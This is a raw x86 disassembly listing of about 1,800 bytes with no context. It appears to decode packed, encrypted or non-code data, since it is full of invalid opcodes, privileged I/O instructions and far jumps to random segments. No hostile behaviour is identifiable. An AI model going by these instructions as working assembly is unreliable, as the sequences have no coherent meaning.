  41aa8f:	mov    esi,0x853af7f9
  41aa94:	push   esi
  41aa95:	jmp    FWORD PTR [esi-0x57]
  41aa98:	mov    cl,0xc6
  41aa9a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa9b:	test   al,0x25
  41aa9d:	scas   al,BYTE PTR es:[edi]
  41aa9e:	sbb    al,BYTE PTR [ebp+0x208a5f7]
  41aaa4:	test   dh,bh
  41aaa6:	jmp    FWORD PTR [edx]
  41aaa8:	xchg   ebp,eax
  41aaa9:	sbb    ebx,ebp
  41aaab:	cmp    al,0x9a
  41aaad:	test   BYTE PTR [ebx+0x4f4d797f],al
  41aab3:	add    ecx,edi
  41aab5:	je     0x41aa4f
  41aab7:	lods   eax,DWORD PTR ds:[esi]
  41aab8:	ret    0xdb14
  41aabb:	xor    esp,ecx
  41aabd:	sub    eax,edx
  41aabf:	shl    bl,0xc1
  41aac2:	mov    edi,0xb2ae25ce
  41aac7:	jbe    0x41aa53
  41aac9:	inc    ebp
  41aaca:	cmp    DWORD PTR [edi+0x5d84d1b1],esp
  41aad0:	(bad)  
  41aad1:	cmc    
  41aad2:	jns    0x41aa70
  41aad4:	push   ebx
  41aad5:	stc    
  41aad6:	mov    bl,0x80
  41aad8:	outs   dx,BYTE PTR ds:[esi]
  41aad9:	cmp    BYTE PTR [eiz*4+0x6aa702b7],dl
  41aae0:	mov    cl,0x18
  41aae2:	xchg   esp,eax
  41aae3:	mov    ah,BYTE PTR [ecx+0x6f51c7d2]
  41aae9:	retf   
  41aaea:	ins    BYTE PTR es:[edi],dx
  41aaeb:	rol    BYTE PTR [eax-0x41],0xf9
  41aaef:	shl    DWORD PTR [ebp+0x3729e89e],1
  41aaf5:	cs mov eax,0x683a070e
  41aafb:	xor    eax,0x319f345
  41ab00:	adc    dl,BYTE PTR [eax-0x69]
  41ab03:	sbb    ah,bh
  41ab05:	loop   0x41aaa6
  41ab07:	outs   dx,BYTE PTR ds:[esi]
  41ab08:	sbb    dh,al
  41ab0a:	sub    BYTE PTR [ecx+0x4390855f],cl
  41ab10:	iret   
  41ab11:	xchg   BYTE PTR [ebx+esi*4],ah
  41ab14:	popa   
  41ab15:	push   es
  41ab16:	mov    al,ds:0xbf13eace
  41ab1b:	call   0x80cc5b0c
  41ab20:	dec    eax
  41ab21:	(bad)  
  41ab22:	js     0x41ab06
  41ab24:	sbb    BYTE PTR [ecx+0x52d7454b],0xfb
  41ab2b:	xchg   esp,eax
  41ab2c:	cdq    
  41ab2d:	sbb    al,0xcb
  41ab2f:	(bad)  
  41ab30:	push   ecx
  41ab31:	lds    eax,FWORD PTR [esi]
  41ab33:	ret    
  41ab34:	aam    0xbd
  41ab36:	fild   WORD PTR [edi-0x28577133]
  41ab3c:	hlt    
  41ab3d:	fsub   DWORD PTR [edi+0x70]
  41ab40:	dec    ecx
  41ab41:	sbb    esi,DWORD PTR ds:0xb04dce8f
  41ab47:	sar    eax,cl
  41ab49:	xor    ebx,DWORD PTR [eax+0x25e3ef18]
  41ab4f:	mov    ds:0x1cf01581,al
  41ab54:	xchg   ebp,eax
  41ab55:	in     eax,0xa0
  41ab57:	inc    ecx
  41ab58:	inc    edi
  41ab59:	add    BYTE PTR [esi+edx*2-0x8],0x22
  41ab5e:	out    dx,al
  41ab5f:	aaa    
  41ab60:	add    ebp,DWORD PTR [edx+ecx*4-0x3670d604]
  41ab67:	into   
  41ab68:	repz inc ebx
  41ab6a:	out    dx,al
  41ab6b:	fs daa 
  41ab6d:	jns    0x41aba6
  41ab6f:	xchg   esp,eax
  41ab70:	mov    ebx,0x60b9d4
  41ab75:	dec    edi
  41ab76:	hlt    
  41ab77:	xor    eax,0xde72d126
  41ab7c:	push   ebx
  41ab7d:	fcmovbe st,st(2)
  41ab7f:	pop    edx
  41ab80:	jae    0x41abaf
  41ab82:	sahf   
  41ab83:	(bad)  [ebp-0x7b]
  41ab86:	push   es
  41ab87:	sbb    dl,BYTE PTR [eax]
  41ab89:	(bad)  
  41ab8a:	fcmovne st,st(2)
  41ab8c:	adc    esi,ebp
  41ab8e:	lods   eax,DWORD PTR ds:[esi]
  41ab8f:	pop    ds
  41ab90:	push   edx
  41ab91:	in     al,0xa5
  41ab93:	scas   al,BYTE PTR es:[edi]
  41ab94:	xchg   edi,eax
  41ab95:	pop    ecx
  41ab96:	and    al,0x81
  41ab98:	test   al,0xc7
  41ab9a:	and    al,0x7b
  41ab9c:	jle    0x41abf4
  41ab9e:	cmp    DWORD PTR [edi],edx
  41aba0:	xchg   ebp,eax
  41aba1:	mov    al,ds:0xa67b49b5
  41aba6:	in     eax,0x9a
  41aba8:	jnp    0x41ab9d
  41abaa:	hlt    
  41abab:	outs   dx,DWORD PTR ds:[esi]
  41abac:	ja     0x41abd8
  41abae:	add    BYTE PTR [ebp-0x1ae50daf],ch
  41abb4:	fdiv   DWORD PTR [eax+0xf4b418a]
  41abba:	xchg   edx,eax
  41abbb:	and    eax,0xadad813f
  41abc0:	int3   
  41abc1:	ds (bad) 
  41abc5:	xor    al,0x30
  41abc7:	inc    edi
  41abc8:	mov    esp,DWORD PTR [ecx-0x13]
  41abcb:	rcr    BYTE PTR [edi+edx*8-0x38],cl
  41abcf:	das    
  41abd0:	cmc    
  41abd1:	mov    ds:0x4318020a,al
  41abd6:	xor    ah,BYTE PTR [ebx-0x37]
  41abd9:	call   FWORD PTR [edi+0x1714c32c]
  41abdf:	sub    al,0x42
  41abe1:	enter  0xea70,0xd5
  41abe5:	nop
  41abe6:	xchg   BYTE PTR [ebx+0x2b],bl
  41abe9:	sar    DWORD PTR [esi],0x56
  41abec:	mov    esi,0xe0b6f8d2
  41abf1:	sub    DWORD PTR ds:0x4a337e5e,0xffffffc9
  41abf8:	test   BYTE PTR [edx+edx*4-0x36],ah
  41abfc:	jno    0x41ac75
  41abfe:	ret    0x9b38
  41ac01:	int3   
  41ac02:	or     esp,DWORD PTR [esi+0x46b2fd61]
  41ac08:	jg     0x41ab8a
  41ac0a:	push   ds
  41ac0b:	imul   eax,DWORD PTR [edx+0x62],0x13c6b732
  41ac12:	dec    edx
  41ac13:	gs pop edi
  41ac15:	arpl   WORD PTR [ebx+0x61ae4050],bp
  41ac1b:	dec    eax
  41ac1c:	into   
  41ac1d:	xor    DWORD PTR ds:0x82fc12e7,esi
  41ac23:	or     eax,0xad7f4f58
  41ac28:	xchg   esi,eax
  41ac29:	rol    DWORD PTR [ecx+0x3c74296c],cl
  41ac2f:	sub    al,0xc4
  41ac31:	sti    
  41ac32:	ins    DWORD PTR es:[edi],dx
  41ac33:	(bad)  
  41ac34:	jo     0x41ac5d
  41ac36:	jge    0x41ac95
  41ac38:	and    al,0x6c
  41ac3a:	jp     0x41ac0e
  41ac3c:	inc    edi
  41ac3d:	or     al,0x3e
  41ac3f:	adc    edx,DWORD PTR [ecx+0x67]
  41ac42:	ins    DWORD PTR es:[edi],dx
  41ac43:	aaa    
  41ac44:	scas   eax,DWORD PTR es:[edi]
  41ac45:	dec    ecx
  41ac46:	push   ebp
  41ac47:	sub    BYTE PTR [edx],dl
  41ac49:	sbb    eax,0x5f5381d7
  41ac4e:	in     al,dx
  41ac4f:	sub    BYTE PTR [ecx],ah
  41ac51:	fincstp 
  41ac53:	and    BYTE PTR [ebx+0x5],dh
  41ac56:	test   DWORD PTR [eax],ebp
  41ac58:	loop   0x41ac5b
  41ac5a:	loopne 0x41ac3c
  41ac5c:	repnz nop
  41ac5e:	sysenter 
  41ac60:	mov    eax,ds:0xd4163135
  41ac65:	(bad)  
  41ac66:	ins    DWORD PTR es:[edi],dx
  41ac67:	repz or eax,0xb179d2cc
  41ac6d:	fdivr  QWORD PTR [esi]
  41ac6f:	loop   0x41ac57
  41ac71:	stos   DWORD PTR es:[edi],eax
  41ac72:	int    0xaf
  41ac74:	(bad)  
  41ac75:	sub    ecx,eax
  41ac77:	add    ebp,DWORD PTR [esp+eax*4-0x44]
  41ac7b:	fimul  DWORD PTR [ebx+0x36]
  41ac7e:	leave  
  41ac7f:	sbb    edx,esp
  41ac81:	adc    eax,edi
  41ac83:	cmp    DWORD PTR [ecx-0x6f6225bb],0x3ad668f
  41ac8d:	ds jbe 0x41ac1d
  41ac90:	out    0x2c,al
  41ac92:	leave  
  41ac93:	sar    BYTE PTR [esi+0x4eef37f4],0x2
  41ac9a:	xchg   ecx,eax
  41ac9b:	sbb    al,0x3
  41ac9d:	xor    ecx,DWORD PTR [esi]
  41ac9f:	popa   
  41aca0:	push   ebp
  41aca1:	dec    esi
  41aca2:	or     eax,0x423baf3
  41aca7:	addr16 out dx,eax
  41aca9:	dec    esi
  41acaa:	div    DWORD PTR [edi+0x59da3aef]
  41acb0:	div    BYTE PTR [edx+0x435136f5]
  41acb6:	stos   BYTE PTR es:[edi],al
  41acb7:	inc    ecx
  41acb8:	add    DWORD PTR [eax+0x32],esi
  41acbb:	(bad)  [ebx]
  41acbd:	jns    0x41ad25
  41acbf:	leave  
  41acc0:	xchg   BYTE PTR [eax],ah
  41acc2:	lock push esi
  41acc4:	icebp  
  41acc5:	adc    ch,BYTE PTR [edi+0x4b]
  41acc8:	inc    edi
  41acc9:	inc    esp
  41acca:	xor    eax,0x2371c2c6
  41accf:	cli    
  41acd0:	jg     0x41ac8f
  41acd2:	loop   0x41acda
  41acd4:	xchg   ecx,eax
  41acd5:	outs   dx,BYTE PTR ds:[esi]
  41acd6:	in     al,dx
  41acd7:	mov    ds,WORD PTR [esi+0x22]
  41acda:	leave  
  41acdb:	jge    0x41ad10
  41acdd:	mov    WORD PTR [edi+ebp*2],cs
  41ace0:	jg     0x41ad19
  41ace2:	inc    esi
  41ace3:	inc    edx
  41ace4:	pop    eax
  41ace5:	sub    ah,BYTE PTR [eax+edi*2]
  41ace8:	or     bh,bl
  41acea:	dec    esi
  41aceb:	das    
  41acec:	arpl   WORD PTR [ebx],bp
  41acee:	sahf   
  41acef:	adc    ah,BYTE PTR [ecx-0x3b]
  41acf2:	stos   DWORD PTR es:[edi],eax
  41acf3:	cmc    
  41acf4:	xchg   ebp,eax
  41acf5:	adc    BYTE PTR [eax+ebx*2-0x6d181c0],cl
  41acfc:	and    DWORD PTR [edx],edx
  41acfe:	or     eax,0x12aa6627
  41ad03:	jle    0x41ad1b
  41ad05:	sbb    DWORD PTR [edx],ecx
  41ad07:	push   0x10
  41ad09:	cmp    ah,BYTE PTR [eax-0x40]
  41ad0c:	(bad)  
  41ad0e:	out    dx,eax
  41ad0f:	or     ch,ch
  41ad11:	and    al,0x74
  41ad13:	and    BYTE PTR [edi],ch
  41ad15:	ins    BYTE PTR es:[edi],dx
  41ad16:	mov    al,ds:0x439a1a56
  41ad1b:	cld    
  41ad1c:	and    ecx,ebx
  41ad1e:	add    eax,0xd9453656
  41ad23:	adc    dl,BYTE PTR [eax]
  41ad25:	ins    BYTE PTR es:[edi],dx
  41ad26:	icebp  
  41ad27:	fistp  DWORD PTR [esi]
  41ad29:	in     eax,0x48
  41ad2b:	mov    al,0xc5
  41ad2d:	push   ecx
  41ad2e:	mov    dh,0x67
  41ad30:	test   BYTE PTR [edi],cl
  41ad32:	mov    dl,0xf5
  41ad34:	scas   al,BYTE PTR es:[edi]
  41ad35:	cdq    
  41ad36:	mov    DWORD PTR [ebp+edx*2+0x3794a7dd],ebp
  41ad3d:	adc    eax,0xe34e1339
  41ad42:	aaa    
  41ad43:	sub    DWORD PTR [edi-0x12],edi
  41ad46:	faddp  st(7),st
  41ad48:	add    al,ch
  41ad4a:	jmp    0xf91562c4
  41ad4f:	fisttp DWORD PTR [esi]
  41ad51:	sbb    eax,0xbe35ad67
  41ad56:	jne    0x41adb3
  41ad58:	pop    eax
  41ad59:	jne    0x41acf3
  41ad5b:	fistp  DWORD PTR fs:[edi-0x33]
  41ad5f:	daa    
  41ad60:	cs jnp 0x41add2
  41ad63:	mov    bl,0x13
  41ad65:	mov    eax,DWORD PTR [ebp+0x477ed2f1]
  41ad6b:	in     eax,0x9f
  41ad6d:	aas    
  41ad6e:	push   ss
  41ad6f:	dec    edx
  41ad70:	pop    es
  41ad71:	cdq    
  41ad72:	call   0x30ba:0x613094bb
  41ad79:	test   al,0x28
  41ad7b:	push   ebp
  41ad7c:	repnz or DWORD PTR [esi+ebp*8],edx
  41ad80:	inc    esi
  41ad81:	inc    ecx
  41ad82:	rcl    DWORD PTR [edx+0x1c],0xda
  41ad86:	dec    ebx
  41ad87:	sbb    BYTE PTR [ebp+0x6e],dh
  41ad8a:	fidiv  DWORD PTR [esi*4+0x3692dfa8]
  41ad91:	and    al,0x91
  41ad93:	cmp    BYTE PTR [ecx],al
  41ad95:	scas   eax,DWORD PTR es:[edi]
  41ad96:	and    ebx,0xe35c9904
  41ad9c:	dec    ebp
  41ad9d:	loope  0x41adfa
  41ad9f:	rol    BYTE PTR fs:[ecx-0x51],1
  41ada3:	and    al,0xc0
  41ada5:	mov    esp,0x57043a70
  41adaa:	adc    al,0x6d
  41adac:	or     al,0x35
  41adae:	xor    al,0xb4
  41adb0:	inc    ebp
  41adb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41adb2:	cmp    DWORD PTR [ebx+0x3],ecx
  41adb5:	or     eax,0xab684fd2
  41adba:	rol    edi,cl
  41adbc:	stos   DWORD PTR es:[edi],eax
  41adbd:	test   al,0x80
  41adbf:	popa   
  41adc0:	pop    ds
  41adc1:	ror    ch,1
  41adc3:	in     al,dx
  41adc4:	mov    dh,0x94
  41adc6:	lods   eax,DWORD PTR ds:[esi]
  41adc7:	jl     0x41ae08
  41adc9:	jmp    0x41ae0f
  41adcb:	scas   eax,DWORD PTR es:[edi]
  41adcc:	cwde   
  41adcd:	sub    ah,BYTE PTR [eax+ecx*2-0x50]
  41add1:	clc    
  41add2:	inc    eax
  41add3:	sub    BYTE PTR [ebx+0x27],ch
  41add6:	loopne 0x41ae25
  41add8:	inc    ch
  41adda:	pop    edx
  41addb:	jmp    0x41adf0
  41addd:	jge    0x41ad8f
  41addf:	push   esp
  41ade0:	cs retf 
  41ade2:	outs   dx,DWORD PTR ds:[esi]
  41ade3:	xor    eax,0xea7e98f
  41ade8:	ins    BYTE PTR es:[edi],dx
  41ade9:	and    eax,0x5d549daa
  41adee:	call   0xc652e7de
  41adf3:	bnd jbe 0x41ade8
  41adf6:	lea    esp,[ecx+0x675ae01e]
  41adfc:	(bad)  
  41adfd:	(bad)  
  41adfe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41adff:	fisubr DWORD PTR [ecx+0x600e4714]
  41ae05:	mov    ch,0xc7
  41ae07:	arpl   WORD PTR [edi-0x412b78fc],cx
  41ae0d:	mov    esi,esi
  41ae0f:	test   BYTE PTR [ebx],dh
  41ae11:	cli    
  41ae12:	jmp    0x2f4d:0xd81b48ee
  41ae19:	idiv   DWORD PTR [edi+esi*2]
  41ae1c:	and    al,cl
  41ae1e:	add    ch,BYTE PTR [esp+ebx*1+0x21]
  41ae22:	push   0x1ffab31
  41ae27:	mul    DWORD PTR [ecx-0x69fb3395]
  41ae2d:	scas   eax,DWORD PTR es:[edi]
  41ae2e:	int    0x5c
  41ae30:	jno    0x41adf0
  41ae32:	mov    cl,0x95
  41ae34:	fsqrt  
  41ae36:	push   eax
  41ae37:	aam    0xf3
  41ae39:	enter  0xde9,0x6a
  41ae3d:	in     al,dx
  41ae3e:	repz rcl DWORD PTR [edi],cl
  41ae41:	repz jl 0x41adc7
  41ae44:	daa    
  41ae45:	or     esp,esp
  41ae47:	stc    
  41ae48:	test   BYTE PTR [edx-0x73],dl
  41ae4b:	mov    eax,0x43cc588f
  41ae50:	and    dh,BYTE PTR [edi-0x7e1a485f]
  41ae56:	inc    edi
  41ae57:	inc    ebp
  41ae58:	ficom  DWORD PTR [ebp-0x7a]
  41ae5b:	adc    edi,DWORD PTR [ebp+0x1c0f5ad9]
  41ae61:	(bad)  
  41ae62:	sti    
  41ae63:	loope  0x41ae2b
  41ae65:	push   ebx
  41ae66:	outs   dx,DWORD PTR ds:[esi]
  41ae67:	stc    
  41ae68:	dec    esi
  41ae69:	popa   
  41ae6a:	sbb    al,0xed
  41ae6c:	in     al,0x8e
  41ae6e:	imul   DWORD PTR [ebp+0xfa48313]
  41ae74:	push   eax
  41ae75:	pushf  
  41ae76:	je     0x41ae6d
  41ae78:	mov    ecx,0xa7d7e230
  41ae7d:	lods   eax,DWORD PTR ds:[esi]
  41ae7e:	xchg   esi,eax
  41ae7f:	scas   al,BYTE PTR es:[edi]
  41ae80:	dec    edx
  41ae81:	xchg   DWORD PTR [ebx+0x58],esp
  41ae84:	int3   
  41ae85:	out    dx,al
  41ae86:	je     0x41ae8d
  41ae88:	ja     0x41ae12
  41ae8a:	mov    esp,0xcbb80e3e
  41ae8f:	mov    edi,DWORD PTR [edi]
  41ae91:	sbb    cl,bh
  41ae93:	mov    BYTE PTR [esp+esi*4],0x16
  41ae97:	jb     0x41ae1c
  41ae99:	or     eax,0x7cb3278e
  41ae9e:	jmp    0xf366:0xa4a6967
  41aea5:	inc    ecx
  41aea6:	rcr    BYTE PTR [ebx],cl
  41aea8:	jp     0x41af0b
  41aeaa:	jnp    0x41aeff
  41aeac:	pusha  
  41aead:	push   0x628a42e9
  41aeb2:	xchg   BYTE PTR [esi+0x18],dh
  41aeb5:	inc    edi
  41aeb6:	(bad)  
  41aeb7:	and    ebp,DWORD PTR [eax-0x384faa9b]
  41aebd:	sbb    BYTE PTR [esi],al
  41aebf:	retf   0x5cdd
  41aec2:	ficomp WORD PTR [eax-0x1d388d89]
  41aec8:	popf   
  41aec9:	fldenv [ecx-0x3b]
  41aecc:	push   0x6e3fdb32
  41aed1:	js     0x41ae96
  41aed3:	icebp  
  41aed4:	outs   dx,BYTE PTR ds:[esi]
  41aed5:	stos   DWORD PTR es:[di],eax
  41aed7:	fmul   QWORD PTR [edi+0x139ed743]
  41aedd:	jo     0x41ae7f
  41aedf:	mov    cl,0xcd
  41aee1:	fld    DWORD PTR [ebx+0x7710521]
  41aee7:	mov    ch,0xad
  41aee9:	test   BYTE PTR [edi+0x11],al
  41aeec:	iret   
  41aeed:	mov    ebx,0xe5aad25d
  41aef2:	cmc    
  41aef3:	out    dx,eax
  41aef4:	std    
  41aef5:	dec    ebx
  41aef6:	jmp    0x41ae9f
  41aef8:	mov    WORD PTR [ebx+0x5d],ds
  41aefb:	fidivr WORD PTR [edx]
  41aefd:	ret    
  41aefe:	lahf   
  41aeff:	xchg   esi,eax
  41af00:	cmp    al,BYTE PTR [esi+ecx*4-0xe4c7a29]
  41af07:	pop    edx
  41af08:	mov    esi,0xb3dbc234
  41af0d:	sub    eax,0xa221f2a0
  41af12:	mov    ds:0x124518f3,al
  41af17:	jmp    0x8d4f:0xc720d92b
  41af1e:	stc    
  41af1f:	mov    esi,0xe76f825b
  41af24:	cli    
  41af25:	and    eax,0x1176561e
  41af2a:	es dec ebp
  41af2c:	jmp    0x5376:0x798772ff
  41af33:	jnp    0x41af80
  41af35:	dec    ebp
  41af36:	push   esp
  41af37:	pop    edi
  41af38:	mov    esp,DWORD PTR [eax-0x3f7774f1]
  41af3e:	add    DWORD PTR [ecx-0x7846a37d],ebp
  41af44:	mov    dh,0xc8
  41af46:	push   cs
  41af47:	cs jmp 0xdcc5:0x4342eb5
  41af4f:	jmp    0x32ab:0xba7dbe3a
  41af56:	xor    esp,DWORD PTR [ebx+0x33]
  41af59:	mov    DWORD PTR [ebp-0x606ff35d],ebx
  41af5f:	mov    DWORD PTR [ecx],edx
  41af61:	dec    ecx
  41af62:	and    BYTE PTR [ecx-0x77],ch
  41af65:	mov    edx,0x8426dbcd
  41af6a:	fs push ebx
  41af6c:	and    edi,DWORD PTR [edx+ebx*8+0x1]
  41af70:	jmp    0x41af64
  41af72:	and    edi,DWORD PTR [edx-0x7a]
  41af75:	xchg   ebp,eax
  41af76:	cmc    
  41af77:	pop    ebp
  41af78:	pop    ds
  41af79:	pop    ebx
  41af7a:	xor    eax,0xf6d7b67c
  41af7f:	cwde   
  41af80:	(bad)  
  41af81:	dec    esi
  41af82:	mov    esp,0x34f8397
  41af87:	aas    
  41af88:	neg    DWORD PTR [edi-0x4d]
  41af8b:	test   esp,ecx
  41af8d:	xor    al,0xda
  41af8f:	mov    dh,0x89
  41af91:	dec    ecx
  41af92:	into   
  41af93:	xor    BYTE PTR [edi],bl
  41af95:	dec    esp
  41af96:	xor    eax,0xd55f8aef
  41af9b:	adc    DWORD PTR [ebp+0x4],esp
  41af9e:	add    al,0x21
  41afa0:	xchg   edx,eax
  41afa1:	pop    esp
  41afa2:	mov    ds:0xd0e258a6,eax
  41afa7:	mov    ds:0xd737f38e,al
  41afac:	lods   eax,DWORD PTR ds:[esi]
  41afad:	imul   eax,DWORD PTR [edx-0xc5f6cc3],0x98cde098
  41afb7:	js     0x41b019
  41afb9:	stc    
  41afba:	inc    edi
  41afbb:	mov    esi,DWORD PTR ds:[ebp-0x28f847ce]
  41afc2:	scas   al,BYTE PTR es:[edi]
  41afc3:	and    BYTE PTR es:[ebx],dl
  41afc6:	xchg   edx,eax
  41afc7:	leave  
  41afc8:	xchg   esp,eax
  41afc9:	inc    edi
  41afca:	cli    
  41afcb:	dec    esi
  41afcc:	popa   
  41afcd:	mov    edi,DWORD PTR [eax+esi*1]
  41afd0:	popf   
  41afd1:	fadd   QWORD PTR [edx-0x66]
  41afd4:	sbb    edx,ebp
  41afd6:	out    0xb3,al
  41afd8:	adc    DWORD PTR [ebx-0x5c142f01],0x19adabf3
  41afe2:	mov    al,0x76
  41afe4:	pop    es
  41afe5:	inc    ecx
  41afe6:	add    eax,0x30e4ccef
  41afeb:	mov    DWORD PTR [ebx-0x67],ebx
  41afee:	jo     0x41b003
  41aff0:	xchg   ebx,eax
  41aff1:	test   al,0x36
  41aff3:	outs   dx,DWORD PTR ds:[esi]
  41aff4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41aff5:	jg     0x41b014
  41aff7:	and    DWORD PTR [ecx],ebx
  41aff9:	and    al,0xe0
  41affb:	mov    esi,0x60ff4b0b
  41b000:	cmp    DWORD PTR gs:[eax],esi
  41b003:	xchg   ecx,eax
  41b004:	ds inc esp
  41b006:	ror    DWORD PTR [esi+0x17],0x12
  41b00a:	scas   al,BYTE PTR es:[edi]
  41b00b:	fnstenv [edx-0x3a56a04e]
  41b011:	sahf   
  41b012:	jae    0x41b005
  41b014:	mov    dl,0x50
  41b016:	cli    
  41b017:	add    ch,bh
  41b019:	(bad)  
  41b01a:	mov    ebp,0x17c1880a
  41b01f:	in     eax,0xd5
  41b021:	imul   BYTE PTR [esi-0x7b720653]
  41b027:	test   BYTE PTR [esi+ebx*1],bh
  41b02a:	enter  0xe8f5,0x35
  41b02e:	jae    0x41b057
  41b030:	sbb    al,0x7b
  41b032:	xor    BYTE PTR [edi+0x4a840dd9],al
  41b038:	xchg   ecx,eax
  41b039:	lods   al,BYTE PTR ds:[esi]
  41b03a:	(bad)
  41b03d:	retf   
  41b03e:	pop    edi
  41b03f:	aam    0xb5
  41b041:	scas   al,BYTE PTR es:[di]
  41b043:	adc    DWORD PTR ds:[ebp-0x53],edi
  41b047:	pop    ds
  41b048:	mov    al,0x6a
  41b04a:	push   ss
  41b04b:	cld    
  41b04c:	and    eax,0x35629541
  41b051:	leave  
  41b052:	jmp    0x41b028
  41b054:	adc    ecx,DWORD PTR [ecx]
  41b056:	sbb    esi,DWORD PTR ds:0xd1ae51ea
  41b05c:	pop    ss
  41b05d:	out    0x56,eax
  41b05f:	cmp    eax,0xe12cbcae
  41b064:	nop
  41b065:	mov    DWORD PTR [esi-0x549320bb],esp
  41b06b:	(bad)  
  41b06d:	add    eax,0x185aa213
  41b072:	ins    BYTE PTR es:[edi],dx
  41b073:	xor    BYTE PTR [ebx-0x10353cbc],cl
  41b079:	sub    ebx,edx
  41b07b:	and    ah,BYTE PTR [edi-0x59]
  41b07e:	xchg   esp,eax
  41b07f:	ficomp WORD PTR [ecx+0x7c]
  41b082:	dec    esp
  41b083:	dec    eax
  41b084:	push   ecx
  41b085:	loopne 0x41b03e
  41b087:	mov    edx,0x1c90d754
  41b08c:	test   eax,0xe9b86b34
  41b091:	push   edx
  41b092:	fcomi  st,st(5)
  41b094:	mov    cl,0x2c
  41b096:	in     al,0x1d
  41b098:	mov    al,0x4d
  41b09a:	imul   edx
  41b09c:	add    al,BYTE PTR [ebx+0x43]
  41b09f:	push   eax
  41b0a0:	xor    esp,DWORD PTR [edx-0x57]
  41b0a3:	jg     0x41b04a
  41b0a5:	stc    
  41b0a6:	fwait
  41b0a7:	mov    ah,0x53
  41b0a9:	stos   BYTE PTR es:[edi],al
  41b0aa:	sub    dl,BYTE PTR [ebx-0x18]
  41b0ad:	adc    DWORD PTR [edi-0x1],eax
  41b0b0:	and    BYTE PTR [ebx-0x4],ch
  41b0b3:	ret    
  41b0b4:	pop    esi
  41b0b5:	popf   
  41b0b6:	cli    
  41b0b7:	lods   eax,DWORD PTR ds:[esi]
  41b0b8:	xchg   ebp,eax
  41b0b9:	jo     0x41b063
  41b0bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0bc:	xchg   ecx,eax
  41b0bd:	mov    ds:0xe272f614,eax
  41b0c2:	mov    ds:0xa83fa70c,eax
  41b0c7:	sub    bl,BYTE PTR [edi+0x1a898501]
  41b0cd:	es retf 
  41b0cf:	xor    eax,DWORD PTR [esi]
  41b0d1:	stc    
  41b0d2:	adc    al,0x14
  41b0d4:	aaa    
  41b0d5:	jnp    0x715983ab
  41b0db:	mov    ecx,0x8c11b97c
  41b0e0:	mov    ch,0x34
  41b0e2:	mov    BYTE PTR [ebx-0x6a],ch
  41b0e5:	pop    ecx
  41b0e6:	jo     0x41b075
  41b0e8:	adc    DWORD PTR [edi],ecx
  41b0ea:	stos   BYTE PTR es:[edi],al
  41b0eb:	outs   dx,DWORD PTR ds:[esi]
  41b0ec:	outs   dx,DWORD PTR ds:[esi]
  41b0ed:	add    eax,0x2462c9db
  41b0f2:	adc    al,0x6
  41b0f4:	jg     0x41b133
  41b0f6:	daa    
  41b0f7:	mov    DWORD PTR [eax],esp
  41b0f9:	push   eax
  41b0fa:	clc    
  41b0fb:	imul   ebp,DWORD PTR [ebp*8+0x646edda5],0x2b
  41b103:	(bad)
  41b106:	sbb    DWORD PTR [eax],ebx
  41b108:	add    eax,0x127e53e8
  41b10d:	call   0xd35c8366
  41b112:	add    al,0x81
  41b114:	call   0x69c6091a
  41b119:	fimul  DWORD PTR [eax-0x29]
  41b11c:	sub    cl,ch
  41b11e:	outs   dx,DWORD PTR ds:[esi]
  41b11f:	mov    bl,0x94
  41b121:	ins    BYTE PTR es:[edi],dx
  41b122:	xlat   BYTE PTR ds:[ebx]
  41b123:	xor    DWORD PTR [ecx+0x3816d94a],ebp
  41b129:	daa    
  41b12a:	inc    ebp
  41b12b:	xor    eax,0xde38f42f
  41b130:	cmp    ch,dl
  41b132:	and    al,0xe
  41b134:	push   0xba9c37d9
  41b139:	jg     0x41b1a1
  41b13b:	inc    ecx
  41b13c:	es cs inc eax
  41b13f:	add    DWORD PTR [eax],esp
  41b141:	mov    BYTE PTR [edi+0x2a],cl
  41b144:	cld    
  41b145:	rcr    DWORD PTR [esi-0x29adc1c2],0xa8
  41b14c:	test   eax,0xcf24c14a
  41b151:	out    dx,eax
  41b152:	test   BYTE PTR [ecx],0xf2
  41b155:	pushf  
  41b156:	in     eax,0xbb
  41b158:	mov    ebx,0x3005fcdf
  41b15d:	push   ebx
  41b15e:	sbb    BYTE PTR [edi+0x7d6dda68],al
  41b164:	or     BYTE PTR [ebx],al
  41b166:	into   
  41b167:	es cwde 
  41b169:	inc    ebp
  41b16a:	pop    ebp
  41b16b:	and    ch,BYTE PTR [edx-0x1a]
  41b16e:	mov    dh,0x74
  41b170:	aam    0xf9
  41b172:	mov    ss,WORD PTR [ecx+0x22c47e99]
  41b178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b179:	into   
  41b17a:	repnz data16 or cl,BYTE PTR cs:[eax]
  41b17f:	clc    
  41b180:	push   edi
  41b181:	or     al,0x38
  41b183:	mov    esi,0x156d9f33
  41b188:	jne    0x41b18f
  41b18a:	sbb    al,0xaa
  41b18c:	pop    ss
  41b18d:	dec    esp
  41b18e:	jecxz  0x41b1bd
  41b190:	jl     0x41b123
  41b192:	push   0xa92d688e
  41b197:	add    al,0xf8
  41b199:	mov    ch,0x57
  41b19b:	aam    0xca
  41b19d:	or     esp,DWORD PTR [ebx]
  41b19f:	mov    esi,0xa779ba53
  41b1a4:	jmp    0x9fa0:0x593cc639
  41b1ab:	add    BYTE PTR [esi],al
  41b1ad:	aam    0xde
  41b1af:	jns    0x41b1dd
  41b1b1:	js     0x41b171
  41b1b3:	and    eax,0xcf417527
  41b1b8:	push   0xfffffff8
  41b1ba:	push   ecx
  41b1bb:	lods   eax,DWORD PTR ds:[esi]
  41b1bc:	jl     0x41b1a9
  41b1be:	aas    
  41b1bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b1c0:	lea    ecx,[ebx-0x45]
  41b1c3:	xchg   esi,eax
  41b1c4:	dec    edx
  41b1c5:	xor    DWORD PTR [ebx-0x4bc345ee],ecx
  41b1cb:	xor    ecx,DWORD PTR [ecx+0x68]
  41b1ce:	iret   
  41b1cf:	xor    ah,0xa6
  41b1d2:	jmp    0x41b15f
  41b1d4:	test   al,0xce
  41b1d6:	call   0x7785a018
  41b1db:	pop    ebp
  41b1dc:	(bad)  
  41b1dd:	call   DWORD PTR [eax-0x2c]
  41b1e0:	mov    eax,ds:0x7132559e
  41b1e5:	inc    ebp
  41b1e6:	mov    cl,ch
